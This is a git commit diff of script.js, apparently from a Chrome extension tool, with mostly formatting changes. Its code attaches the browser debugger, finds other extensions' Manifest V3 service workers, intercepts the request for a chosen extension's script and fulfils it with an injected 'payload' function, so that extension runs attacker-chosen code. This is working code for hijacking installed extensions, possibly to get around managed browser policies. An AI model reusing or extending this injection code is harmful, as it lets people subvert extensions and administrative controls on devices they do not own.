abd532793358c83361681e7e59236e0bb8f97ce4
Aka, but nice <120267628+akabutnicer@users.noreply.github.com>
2023-11-20 10:18:03 -0500

    Update script.js

--- script.js
+++ script.js
@@ -3,7 +3,10 @@ const target = { targetId: "browser" };
 function getAllTargets() {
   return new Promise(async (resolve, reject) => {
     await chrome.debugger.attach(target, "1.3");
-    let { targetInfos: targets } = await chrome.debugger.sendCommand(target, "Target.getTargets");
+    let { targetInfos: targets } = await chrome.debugger.sendCommand(
+      target,
+      "Target.getTargets"
+    );
     resolve(targets);
   });
 }
@@ -13,39 +16,33 @@ async function getManifestV3Targets() {
   const allTargets = await getAllTargets();
   for (const target in allTargets) {
     const { protocol } = new URL(allTargets[target].url);
-    if (protocol == "chrome-extension:" && allTargets[target].type == "service_worker") {
+    if (
+      protocol == "chrome-extension:" &&
+      allTargets[target].type == "service_worker"
+    ) {
       extensions.push(allTargets[target]);
     }
   }
   return extensions;
 }
 async function onRequest(url) {
-  alert(url);
   await chrome.debugger.detach(target);
   await new Promise((resolve) => setTimeout(resolve, 1000));
-  await chrome.debugger.attach(target, "1.3")
+  await chrome.debugger.attach(target, "1.3");
   chrome.debugger.onEvent.addListener(async (details, type, event) => {
     if (event.request.url !== url) {
-      await chrome.debugger.sendCommand(
-        target,
-        "Fetch.continueRequest",
-        {
-          requestId: event.requestId,
-        }
-      );
+      await chrome.debugger.sendCommand(target, "Fetch.continueRequest", {
+        requestId: event.requestId,
+      });
       return;
     }
+    await chrome.debugger.sendCommand(target, "Fetch.fulfillRequest", {
+      requestId: event.requestId,
+      responseCode: 200,
+      body: btoa(`(${payload.toString()})()`),
+    });
     await chrome.debugger.sendCommand(
-      target,
-      "Fetch.fulfillRequest",
-      {
-        requestId: event.requestId,
-        responseCode: 200,
-        body: btoa(`(${payload.toString()})()`),
-      }
-    );
-    await chrome.debugger.sendCommand(
-     target,
+      { targetId: "browser" },
       "Target.createTarget",
       {
         url: url,
@@ -64,7 +61,13 @@ async function setUpButtons() {
       onRequest(targets[target].url);
     };
     let id = document.createElement("h2");
-    id.textContent = targets[target].url.split("chrome-extension://")[1].toString().split("/")[0] + " - " + targets[target].type;
+    id.textContent =
+      targets[target].url
+        .split("chrome-extension://")[1]
+        .toString()
+        .split("/")[0] +
+      " - " +
+      targets[target].type;
     document.querySelector(".targets").appendChild(button);
     document.querySelector(".targets").appendChild(id);
   }
